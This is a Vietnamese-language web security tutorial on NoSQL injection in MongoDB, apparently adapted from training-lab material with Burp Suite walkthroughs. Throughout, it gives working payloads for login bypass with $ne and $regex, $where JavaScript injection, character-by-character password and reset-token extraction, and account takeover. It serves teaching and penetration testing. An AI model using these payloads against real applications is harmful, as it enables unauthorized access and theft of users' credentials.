# NoSQL injection

## Types of NoSQL injection

Có hai loại NoSQL injection khác nhau:

- Syntax injection - Điều này xảy ra khi có thể phá vỡ cú pháp truy vấn NoSQL, cho phép inject payload. Phương pháp này tương tự như phương pháp được sử dụng trong SQL injection. Tuy nhiên, bản chất của cuộc tấn công thay đổi đáng kể, vì cơ sở dữ liệu NoSQL sử dụng nhiều ngôn ngữ truy vấn, loại cú pháp truy vấn và cấu trúc dữ liệu khác nhau.

- Operator injection - Điều này xảy ra khi có thể sử dụng toán tử truy vấn NoSQL để thao tác các truy vấn.

Trong chủ đề này xem xét cách kiểm tra lỗ hổng NoSQL nói chung, sau đó tập trung vào việc khai thác lỗ hổng trong MongoDB, đây là cơ sở dữ liệu NoSQL phổ biến nhất.

## NoSQL syntax injection

Có khả năng phát hiện ra lỗ hổng NoSQL injection bằng cách cố gắng phá vỡ cú pháp truy vấn. Để thực hiện việc này, hãy kiểm tra từng đầu vào một cách có hệ thống bằng cách gửi các chuỗi fuzz và ký tự đặc biệt kích hoạt lỗi cơ sở dữ liệu hoặc một số hành vi có thể phát hiện khác nếu chúng không được ứng dụng sanitized hoặc filter đầy đủ.

Nếu biết ngôn ngữ API của cơ sở dữ liệu mục tiêu, hãy sử dụng các ký tự đặc biệt và chuỗi fuzz có liên quan đến ngôn ngữ đó. Nếu không, hãy sử dụng nhiều chuỗi fuzz khác nhau để nhắm mục tiêu đến nhiều ngôn ngữ API.

### Detecting syntax injection in MongoDB

Xem xét một ứng dụng mua sắm hiển thị sản phẩm theo các danh mục khác nhau. Khi người dùng chọn danh mục đồ uống có ga, trình duyệt của họ yêu cầu URL sau:

```
https://insecure-website.com/product/lookup?category=fizzy
```

Điều này khiến ứng dụng gửi truy vấn JSON để lấy các sản phẩm có liên quan từ `product` collection trong cơ sở dữ liệu MongoDB:

```
this.category == 'fizzy'
```

Để kiểm tra xem đầu vào có dễ bị tấn công hay không, hãy gửi một chuỗi fuzz trong giá trị của tham số `category`. Một chuỗi ví dụ cho MongoDB là:

```
'"`{
;$Foo}
$Foo \xYZ
```

Sử dụng chuỗi fuzz này để thực hiện đòn tấn công sau:

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Nếu điều này gây ra thay đổi so với phản hồi ban đầu thì có thể thông tin đầu vào của người dùng không được filter hoặc sanitized đúng cách.

```
Lưu ý: Lỗ hổng tiêm NoSQL có thể xảy ra trong nhiều bối cảnh khác nhau và cần điều chỉnh chuỗi fuzz cho phù hợp. Nếu không, có thể chỉ kích hoạt lỗi xác thực khiến ứng dụng không bao giờ thực thi truy vấn.

Trong ví dụ này đang tiêm chuỗi fuzz qua URL, do đó chuỗi được mã hóa theo URL. Trong một số ứng dụng, có thể cần tiêm payload qua thuộc tính JSON. Trong trường hợp này, payload này sẽ trở thành '\"`{\r;$Foo}\n$Foo \\xYZ\u0000.
```

### Determining which characters are processed

Để xác định ký tự nào được ứng dụng diễn giải là cú pháp, bạn có thể chèn từng ký tự. Ví dụ, có thể gửi ', kết quả là truy vấn MongoDB sau:

```
this.category == '''
```

Nếu điều này gây ra thay đổi so với phản hồi ban đầu, điều này có thể chỉ ra rằng ký tự ' đã phá vỡ cú pháp truy vấn và gây ra lỗi cú pháp. Có thể xác nhận điều này bằng cách gửi chuỗi truy vấn hợp lệ trong đầu vào, ví dụ bằng cách thoát khỏi dấu ngoặc kép:

```
this.category == '\''
```

Nếu điều này không gây ra lỗi cú pháp, điều này có thể có nghĩa là ứng dụng dễ bị tấn công injection.

### Confirming conditional behavior

Sau khi phát hiện ra lỗ hổng, bước tiếp theo là xác định xem có thể tác động đến các điều kiện boolean bằng cú pháp NoSQL hay không.

Để kiểm tra điều này, hãy gửi hai yêu cầu, một yêu cầu có điều kiện false và một yêu cầu có điều kiện true. Ví dụ, có thể sử dụng các câu lệnh điều kiện `' && 0 && 'x` và `' && 1 && 'x` như sau:

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

Nếu ứng dụng hoạt động khác, điều này cho thấy điều kiện sai ảnh hưởng đến logic truy vấn, nhưng điều kiện đúng thì không. Điều này cho thấy việc chèn kiểu cú pháp này ảnh hưởng đến truy vấn phía máy chủ.

### Overriding existing conditions 

Bây giờ đã xác định rằng có thể tác động đến các điều kiện boolean, có thể thử ghi đè các điều kiện hiện có để khai thác lỗ hổng. Ví dụ, có thể chèn một điều kiện JavaScript luôn được đánh giá là đúng, chẳng hạn như `'||1||'`:

```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```

Điều này dẫn đến truy vấn MongoDB sau:

```
this.category == 'fizzy'||'1'=='1'
```

Vì điều kiện được injection luôn đúng, nên truy vấn đã sửa đổi trả về tất cả các mục. Điều này cho phép xem tất cả các sản phẩm trong bất kỳ danh mục nào, bao gồm cả các danh mục ẩn hoặc không xác định.

```
Cảnh báo: Hãy cẩn thận khi inject một điều kiện luôn được đánh giá là đúng vào truy vấn NoSQL. Mặc dù điều này có thể vô hại trong ngữ cảnh ban đầu đang inject vào, nhưng các ứng dụng thường sử dụng dữ liệu từ một yêu cầu duy nhất trong nhiều truy vấn khác nhau. Ví dụ, nếu một ứng dụng sử dụng điều kiện này khi cập nhật hoặc xóa dữ liệu, điều này có thể dẫn đến mất dữ liệu ngoài ý muốn.
```

Cũng có thể thêm một ký tự null sau giá trị danh mục. MongoDB có thể bỏ qua tất cả các ký tự sau một ký tự null. Điều này có nghĩa là bất kỳ điều kiện bổ sung nào trên truy vấn MongoDB đều bị bỏ qua. Ví dụ: truy vấn có thể có một hạn chế `this.released` bổ sung:

```
this.category == 'fizzy' && this.released == 1
```

Hạn chế `this.released == 1` chỉ được sử dụng để hiển thị các sản phẩm đã được phát hành. Đối với các sản phẩm chưa phát hành, có lẽ `this.released == 0`.

Trong trường hợp này, kẻ tấn công có thể xây dựng một cuộc tấn công như sau:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Điều này dẫn đến truy vấn NoSQL sau:

```
this.category == 'fizzy'\u0000' && this.released == 1
```

Nếu MongoDB bỏ qua tất cả các ký tự sau ký tự null, điều này sẽ loại bỏ yêu cầu trường released phải được đặt thành 1. Kết quả là, tất cả các sản phẩm trong danh mục `fizzy` đều được hiển thị, bao gồm cả các sản phẩm chưa phát hành.

### Lab: Detecting NoSQL injection

Filter danh mục sản phẩm cho lab này được cung cấp bởi cơ sở dữ liệu MongoDB NoSQL. Nó dễ bị tấn công NoSQL injection.

Để solve lab, hãy thực hiện một cuộc tấn công NoSQL injection khiến ứng dụng hiển thị các sản phẩm chưa phát hành.

#### Solution

1. Trong trình duyệt của Burp, truy cập lab và nhấp vào filter danh mục sản phẩm.

2. Trong Burp, vào `Proxy > HTTP History`. Nhấp chuột phải vào request filter category và chọn `Send to Repeater`.

3. Trong Repeater, hãy gửi ký tự `'` trong tham số category. Lưu ý rằng điều này gây ra lỗi cú pháp JavaScript. Điều này có thể chỉ ra rằng dữ liệu đầu vào của người dùng không được filter hoặc sanitized đúng cách.

4. Gửi payload JavaScript hợp lệ trong giá trị của tham số truy vấn category. Có thể sử dụng payload sau:

    ```
    Gifts'+'
    ```

    Đảm bảo mã hóa URL payload bằng cách highlight và sử dụng phím `Ctrl-U`. Lưu ý rằng điều này không gây ra lỗi cú pháp. Điều này chỉ ra rằng có thể đang xảy ra một dạng inject dữ liệu phía máy chủ.

5. Xác định xem có thể đưa điều kiện boolean vào để thay đổi phản hồi hay không:

    1. Chèn một điều kiện sai vào tham số category. Ví dụ:

        ```
        Gifts' && 0 && 'x
        ```

        Đảm bảo mã hóa URL cho payload. Lưu ý rằng không có sản phẩm nào được truy xuất.

    2. Chèn một điều kiện đúng vào tham số category. Ví dụ:

        ```
        Gifts' && 1 && 'x
        ```

        Đảm bảo mã hóa URL cho payload. Lưu ý rằng các sản phẩm trong danh mục `Gifts` được truy xuất.

6. Gửi một điều kiện boolean luôn được đánh giá là đúng trong tham số category. Ví dụ:

    ```
    Gifts'||1||'
    ```

7. Nhấp chuột phải vào response và chọn `Show response in browser`.

8. Sao chép URL và tải lên trình duyệt của Burp. Xác minh rằng response hiện chứa các sản phẩm chưa phát hành. 

## NoSQL operator injection

Cơ sở dữ liệu NoSQL thường sử dụng toán tử truy vấn, cung cấp các cách để chỉ định các điều kiện mà dữ liệu phải đáp ứng để được đưa vào kết quả truy vấn. Ví dụ về toán tử truy vấn MongoDB bao gồm:

- $where - So khớp các tài liệu thỏa mãn biểu thức JavaScript.

- $ne - So khớp tất cả các giá trị không bằng giá trị đã chỉ định.

- $in - So khớp tất cả các giá trị đã chỉ định trong một mảng.

- $regex - Chọn các tài liệu có giá trị khớp với biểu thức chính quy đã chỉ định.

Có thể chèn toán tử truy vấn để thao tác các truy vấn NoSQL. Để thực hiện việc này, gửi các toán tử khác nhau một cách có hệ thống vào một phạm vi đầu vào của người dùng, sau đó xem xét các response để tìm thông báo lỗi hoặc các thay đổi khác.

### Submitting query operators

Trong các thông báo JSON, có thể chèn toán tử truy vấn dưới dạng các đối tượng lồng nhau. Ví dụ: `{"username":"wiener"}` trở thành `{"username":{"$ne":"invalid"}}`.

Đối với các đầu vào dựa trên URL, có thể chèn toán tử truy vấn thông qua các tham số URL. Ví dụ: `username=wiener` trở thành `username[$ne]=invalid`. Nếu cách này không hiệu quả, có thể thử cách sau:

1. Chuyển đổi phương thức yêu cầu từ `GET` sang `POST`.

2. Thay đổi tiêu đề `Content-Type` thành `application/json`.

3. Thêm JSON vào nội dung message.

4. Chèn toán tử truy vấn vào JSON.

```
Lưu ý: Có thể sử dụng tiện ích mở rộng Content Type Converter để tự động chuyển đổi phương thức yêu cầu và thay đổi yêu cầu POST được mã hóa URL thành JSON.
```

### Detecting operator injection in MongoDB

Xem xét một ứng dụng dễ bị tấn công chấp nhận tên người dùng và mật khẩu trong nội dung của request `POST`:

```
{"username":"wiener","password":"peter"}
```

Kiểm tra từng đầu vào bằng một loạt toán tử. Ví dụ, để kiểm tra xem đầu vào tên người dùng có xử lý toán tử truy vấn hay không, có thể thử lệnh inject sau:

```
{"username":{"$ne":"invalid"},"password":{"peter"}}
```

Nếu toán tử `$ne` được áp dụng, toán tử này sẽ truy vấn tất cả người dùng có tên người dùng không bằng với `invalid`.

Nếu cả tên người dùng và mật khẩu đều xử lý toán tử, có thể bỏ qua xác thực bằng cách sử dụng payload sau:

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Truy vấn này trả về tất cả thông tin đăng nhập mà cả tên người dùng và mật khẩu đều không `invalid`. Do đó, được đăng nhập vào ứng dụng với tư cách là người dùng đầu tiên trong collection.

Để nhắm mục tiêu vào một tài khoản, có thể xây dựng một payload bao gồm tên người dùng đã biết hoặc tên người dùng đã đoán. Ví dụ:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

#### Solution

1. Trong trình duyệt của Burp, đăng nhập vào ứng dụng bằng thông tin đăng nhập `wiener:peter`.

2. Trong Burp, vào `Proxy > HTTP history`. Nhấp chuột phải vào yêu cầu `POST /login` và chọn `Send to Repeater`.

3. Trong Repeater, kiểm tra các tham số username và password để xác định xem chúng có cho phép inject các toán tử MongoDB hay không:

    1. Thay đổi giá trị của tham số `username` từ `"wiener"` thành `{"$ne":""}`, sau đó gửi request. Lưu ý rằng điều này cho phép đăng nhập.

    2. Thay đổi giá trị của tham số tên người dùng từ `{"$ne":""}` thành `{"$regex":"wien.*"}`, sau đó gửi request. Lưu ý rằng có thể đăng nhập khi sử dụng toán tử `$regex`.

    3. Với tham số tên người dùng được đặt thành `{"$ne":""}`, thay đổi giá trị của tham số mật khẩu từ `"peter"` thành `{"$ne":""}`, sau đó gửi lại request. Lưu ý rằng điều này khiến truy vấn trả về số lượng bản ghi không mong muốn. Điều này cho biết rằng có nhiều hơn một người dùng đã được chọn.

4. Với tham số mật khẩu được đặt là `{"$ne":""}`, thay đổi giá trị của tham số tên người dùng thành `{"$regex":"admin.*"}`, sau đó gửi lại request. Lưu ý rằng điều này sẽ đăng nhập thành công với tư cách là người dùng quản trị.

5. Nhấp chuột phải vào response, sau đó chọn `Show response in browser`. Sao chép URL.

6. Paste URL vào trình duyệt của Burp để đăng nhập với tư cách là người dùng `administrator`. 

## Exploiting syntax injection to extract data

Trong nhiều cơ sở dữ liệu NoSQL, một số toán tử hoặc hàm truy vấn có thể chạy mã JavaScript giới hạn, chẳng hạn như toán tử `$where` của MongoDB và hàm `mapReduce()`. Điều này có nghĩa là nếu một ứng dụng dễ bị tấn công sử dụng các toán tử hoặc hàm này, cơ sở dữ liệu có thể đánh giá JavaScript như một phần của truy vấn. Do đó, bạn có thể sử dụng các hàm JavaScript để trích xuất dữ liệu từ cơ sở dữ liệu.

## Exfiltrating data in MongoDB

Xem xét một ứng dụng dễ bị tấn công cho phép người dùng tra cứu tên người dùng đã đăng ký khác và hiển thị vai trò của họ. Điều này kích hoạt một yêu cầu đến URL:

```
https://insecure-website.com/user/lookup?username=admin
```

Điều này dẫn đến truy vấn NoSQL sau của collection `users`:

```
{"$where":"this.username == 'admin'"}
```

Vì truy vấn sử dụng toán tử `$where`, có thể thử chèn các hàm JavaScript vào truy vấn này để nó trả về dữ liệu nhạy cảm. Ví dụ, có thể gửi payload sau:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

Điều này trả về ký tự đầu tiên của chuỗi mật khẩu của người dùng, cho phép trích xuất từng ký tự mật khẩu.

Cũng có thể sử dụng hàm `match()` của JavaScript để trích xuất thông tin. Ví dụ: payload sau cho phép xác định xem mật khẩu có chứa chữ số hay không:

```
admin' && this.password.match(/\d/) || 'a'=='b
```

### Identifying field names

Vì MongoDB xử lý dữ liệu bán cấu trúc không yêu cầu lược đồ cố định, có thể cần xác định các trường hợp lệ trong collection trước khi có thể trích xuất dữ liệu bằng cách sử dụng JavaScript injection.

Ví dụ: để xác định xem cơ sở dữ liệu MongoDB có chứa trường `password` hay không, có thể gửi payload sau:

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Gửi lại payload cho một trường hiện có và cho một trường không tồn tại. Trong ví dụ này, biết rằng trường `username` tồn tại, vì vậy có thể gửi các payload sau:

```
admin' && this.username!=' admin' && this.foo!='
```

Nếu trường `password` tồn tại, mong đợi response giống hệt với phản hồi cho trường hiện có (`username`), nhưng khác với response cho trường không tồn tại (`foo`).

Nếu bạn muốn kiểm tra nhiều tên trường khác nhau, có thể thực hiện tấn công dictionary bằng cách sử dụng wordlist để duyệt qua nhiều tên trường tiềm năng khác nhau.

```
Lưu ý: Cũng có thể sử dụng NoSQL operator injection để trích xuất tên trường theo từng ký tự. Điều này cho phép xác định tên trường mà không cần phải đoán hoặc thực hiện tấn công dictionary.
```

### Lab: Exploiting NoSQL injection to extract data

Chức năng tra cứu người dùng cho lab này được hỗ trợ bởi cơ sở dữ liệu MongoDB NoSQL. Cơ sở dữ liệu này dễ bị tấn công NoSQL.

Để solve lab, hãy trích xuất mật khẩu của người dùng quản trị viên, sau đó đăng nhập vào tài khoản của họ.

Có thể đăng nhập vào tài khoản bằng thông tin đăng nhập sau: `wiener:peter`.

#### Tip

Mật khẩu chỉ sử dụng chữ thường.

#### Solution

1. Trong trình duyệt của Burp, truy cập lab và đăng nhập vào ứng dụng bằng thông tin xác thực `wiener:peter`.

2. Trong Burp, vào `Proxy > HTTP History`. Nhấp chuột phải vào yêu cầu `GET /user/lookup?user=wiener` và chọn `Send to Repeater`.

3. Trong Repeater, gửi ký tự `'` trong tham số người dùng. Lưu ý rằng điều này gây ra lỗi. Điều này có thể chỉ ra rằng dữ liệu đầu vào của người dùng không được filter hoặc sanitized đúng cách.

4. Gửi một payload JavaScript hợp lệ trong tham số người dùng. Ví dụ: có thể sử dụng `wiener'+'`

    Đảm bảo mã hóa URL payload bằng cách highlight nó và sử dụng phím `Ctrl-U`. Lưu ý rằng nó sẽ truy xuất thông tin chi tiết về tài khoản của người dùng `wiener`, điều này chỉ ra rằng có thể đang xảy ra một dạng inject phía máy chủ.

5. Xác định xem có thể inject các điều kiện boolean để thay đổi response hay không:

    1. Gửi một điều kiện sai trong tham số `user`. Ví dụ: `wiener' && '1'=='2`

        Đảm bảo mã hóa URL cho payload. Lưu ý rằng nó sẽ truy xuất thông báo `Could not find user`.

    2. Gửi một điều kiện đúng trong tham số `user`. Ví dụ: `wiener' && '1'=='1`

        Đảm bảo mã hóa URL cho payload. Lưu ý rằng nó không còn gây ra lỗi nữa. Thay vào đó, nó sẽ truy xuất thông tin chi tiết về tài khoản cho người dùng `wiener`. Điều này chứng minh rằng có thể kích hoạt các response khác nhau cho các điều kiện đúng và sai.

6. Xác định độ dài mật khẩu:

    1. Thay đổi tham số người dùng thành `administrator' && this.password.length < 30 || 'a'=='b`, sau đó gửi request.

        Đảm bảo mã hóa URL cho payload. Lưu ý rằng response sẽ truy xuất thông tin chi tiết về tài khoản của người dùng `administrator`. Điều này cho biết điều kiện là đúng vì mật khẩu ít hơn 30 ký tự.

    2. Giảm độ dài mật khẩu trong payload, sau đó gửi lại request.

    3. Tiếp tục thử các độ dài khác nhau.

    4. Lưu ý rằng khi gửi giá trị `9` sẽ truy xuất thông tin chi tiết về tài khoản của người dùng `administrator`, nhưng khi gửi giá trị `8`, nhận được thông báo lỗi vì điều kiện là sai. Điều này cho biết mật khẩu dài 8 ký tự.

7. Nhấp chuột phải vào request và chọn `Send to Intruder`.

8. Trong Intruder, hãy liệt kê mật khẩu:

    1. Thay đổi tham số người dùng thành `administrator' && this.password[§0§]=='§a§`. Điều này bao gồm hai vị trí payload. Đảm bảo mã hóa URL payload.

    2. Đặt loại tấn công thành `Cluster bomb`.

    3. Trong tab `Payload`, đảm bảo rằng `Payload set 1` được chọn, sau đó thêm các số từ 0 đến 7 cho mỗi ký tự của mật khẩu.

    4. Chọn `Payload set 2`, sau đó thêm các chữ cái thường từ a đến z. Nếu đang sử dụng Burp Suite Professional, có thể sử dụng danh sách a-z tích hợp.

    5. Click vào `Start attack`.

    6. Sắp xếp kết quả tấn công theo `Payload 1`, sau đó là `Length`. Lưu ý rằng một yêu cầu cho mỗi vị trí ký tự (0 đến 7) đã được đánh giá là đúng và đã truy xuất thông tin chi tiết cho người dùng `administrator`. Lưu ý các chữ cái từ cột `Payload 2` xuống.

9. Trong trình duyệt của Burp, hãy đăng nhập với tư cách là người dùng `administrator` bằng mật khẩu được liệt kê.

## Exploiting NoSQL operator injection to extract data

Ngay cả khi truy vấn gốc không sử dụng bất kỳ toán tử nào cho phép chạy JavaScript tùy ý, vẫn có thể inject một trong các toán tử này. Sau đó, có thể sử dụng các điều kiện boolean để xác định xem ứng dụng có thực thi bất kỳ JavaScript nào được inject thông qua toán tử này hay không.

### Injection operations in MongoDB

Xem xét một ứng dụng dễ bị tấn công chấp nhận tên người dùng và mật khẩu trong body của request `POST`:

```
{"username":"wiener","password":"peter"}
```

Để kiểm tra xem có thể inject toán tử hay không, có thể thử thêm toán tử `$where` làm tham số bổ sung, sau đó gửi một request trong đó điều kiện được đánh giá là sai và một yêu cầu khác được đánh giá là đúng. Ví dụ:

```
{"username":"wiener","password":"peter", "$where":"0"}
```

```
{"username":"wiener","password":"peter", "$where":"1"}
```

Nếu có sự khác biệt giữa các response, điều này có thể chỉ ra rằng biểu thức JavaScript trong mệnh đề `$where` đang được đánh giá.

### Extracting field names

Nếu đã inject toán tử cho phép chạy JavaScript, có thể sử dụng phương thức `keys()` để trích xuất tên của các trường dữ liệu. Ví dụ: có thể gửi payload sau:

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Điều này kiểm tra trường dữ liệu đầu tiên trong đối tượng người dùng và trả về ký tự đầu tiên của tên trường. Điều này cho phép trích xuất tên trường theo từng ký tự.

### Exfiltrating data using operators

Ngoài ra, có thể trích xuất dữ liệu bằng các toán tử không cho phép chạy JavaScript. Ví dụ, có thể sử dụng toán tử `$regex` để trích xuất dữ liệu theo từng ký tự.

Hãy xem xét một ứng dụng dễ bị tấn công chấp nhận tên người dùng và mật khẩu trong body của request `POST`. Ví dụ:

```
{"username":"myuser","password":"mypass"}
```

Có thể bắt đầu bằng cách kiểm tra xem toán tử `$regex` có được xử lý như sau không:

```
{"username":"admin","password":{"$regex":"^.*"}}
```

Nếu response cho yêu cầu này khác với response nhận được khi gửi mật khẩu không đúng, điều này cho thấy ứng dụng có thể bị tấn công. Có thể sử dụng toán tử `$regex` để trích xuất dữ liệu theo từng ký tự. Ví dụ: payload sau đây kiểm tra xem mật khẩu có bắt đầu bằng a không:

```
{"username":"admin","password":{"$regex":"^a*"}}
```

### Lab: Exploiting NoSQL operator injection to extract unknown fields

Chức năng tra cứu người dùng cho lab này được hỗ trợ bởi cơ sở dữ liệu MongoDB NoSQL. Nó dễ bị tấn công NoSQL.

Để solve lab, hãy đăng nhập với tư cách là `carlos`.

#### Tip

Để giải quyết bài toán này, trước tiên cần phải trích xuất giá trị của token reset mật khẩu cho người dùng carlos.

#### Solution

1. Trong trình duyệt Burp, thử đăng nhập vào ứng dụng bằng tên người dùng `carlos` và mật khẩu `invalid`. Lưu ý rằng nhận được thông báo lỗi `Invalid username or password`.

2. Trong Burp, hãy vào `Proxy > HTTP History`. Nhấp chuột phải vào request `POST /login` và chọn `Send to Reepeater`.

3. Trong Repeater, thay đổi giá trị của tham số password từ `"invalid"` thành `{"$ne":"invalid"}`, sau đó gửi request. Nhận được thông báo lỗi `Account locked`. Không thể truy cập tài khoản của Carlos, nhưng response này cho biết toán tử `$ne` đã được chấp nhận và ứng dụng dễ bị tấn công.

4. Trong trình duyệt của Burp, thử đặt lại mật khẩu cho tài khoản `carlos`. Khi gửi tên người dùng `carlos`, cơ chế đặt lại liên quan đến xác minh email, vì vậy không thể tự reset lại tài khoản.

5. Trong Repeater, sử dụng request `POST /login` để kiểm tra xem ứng dụng có dễ bị tấn công JavaScript hay không:

    1. Thêm `"$where": "0"` làm tham số bổ sung trong dữ liệu JSON như sau: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`

    2. Gửi request. Nhận được thông báo lỗi `Invalid username or password`.

    3. Đổi `"$where": "0" thành "$where": "1"`, sau đó gửi lại request. Nhận được thông báo lỗi `Account locked`. Điều này cho biết JavaScript trong mệnh đề `$where` đang được đánh giá.

6. Nhấp chuột phải vào request và chọn `Send to Intruder`.

7. Trong Intruder, xây dựng một cuộc tấn công để xác định tất cả các trường trên đối tượng người dùng:

    1. Cập nhật tham số `$where` như sau: `"$where":"Object.keys(this)[1].match('^.{}.*')"`

    2. Thêm hai vị trí payload. Vị trí đầu tiên xác định số vị trí ký tự và vị trí thứ hai xác định chính ký tự đó: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`

    3. Đặt loại tấn công thành `Cluster bomb`.

    4. Trong tab `Payloads`, đảm bảo rằng `Payload set 1` được chọn, sau đó đặt `Payload type` thành `Numbers`. Đặt phạm vi số, ví dụ từ 0 đến 20.

    5. Chọn `Payload set 2` và đảm bảo `Payload type` được đặt thành `Simple list`. Thêm tất cả các số, chữ thường và chữ hoa làm payload. 

    6. Click vào `Start attack`.

    7. Sắp xếp kết quả tấn công theo `Payload 1`, sau đó là `Length`, để xác định response có thông báo `Account locked` thay vì thông báo `Invalid username or password`. Lưu ý rằng các ký tự trong cột `Payload 2` đánh vần tên của tham số: `username`.

    8. Lặp lại các bước trên để xác định thêm các tham số JSON. Có thể thực hiện việc này bằng cách tăng chỉ mục của mảng keys với mỗi lần thử, ví dụ: `"$where":"Object.keys(this)[2].match('^.{}.*')"`

        Lưu ý rằng một trong các tham số JSON dành cho token reset mật khẩu.

8. Kiểm tra tên trường reset mật khẩu đã xác định dưới dạng tham số truy vấn trên các endpoint khác nhau:

    1. Trong `Proxy > HTTP history`, xác định yêu cầu `GET /forgot-password` là endpoint có khả năng thú vị, vì nó liên quan đến chức năng reset mật khẩu. Nhấp chuột phải vào request và chọn `Send to Repeater`.

    2. Trong Repeater, hãy gửi một trường không hợp lệ trong URL: `GET /forgot-password?foo=invalid`. Response giống hệt với response ban đầu.

    3. Gửi tên đã trích xuất của trường token reset mật khẩu trong URL: `GET /forgot-password?YOURTOKENNAME=invalid`. Nhận được thông báo lỗi `Invalid token`. Điều này xác nhận rằng có tên token và endpoint chính xác.

9. Trong Intruder, sử dụng yêu cầu `POST /login` để xây dựng một cuộc tấn công trích xuất giá trị token reset mật khẩu của Carlos:

    1. Giữ nguyên các thiết lập từ lần tấn công trước đó, nhưng cập nhật tham số `$where` như sau: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`

        Đảm bảo rằng thay thế `YOURTOKENNAME` bằng tên token reset mật khẩu đã trích xuất ở bước trước.

    2. Click vào `Start attack`.

    3. Sắp xếp kết quả tấn công theo `Payload 1`, sau đó là `Length`, để xác định response có thông báo `Account locked` thay vì thông báo `Invalid username or password`. Lưu ý các chữ cái từ cột `Payload 2` xuống.

10. Trong Repeater, hãy gửi giá trị của token reset mật khẩu trong URL của request `GET / forget-password`: `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`.

11. Nhấp chuột phải vào response và chọn `Request in browser > Original session`. Dán nội dung này vào trình duyệt của Burp.

12. Đổi mật khẩu của Carlos, sau đó đăng nhập với tên `carlos` để solve lab.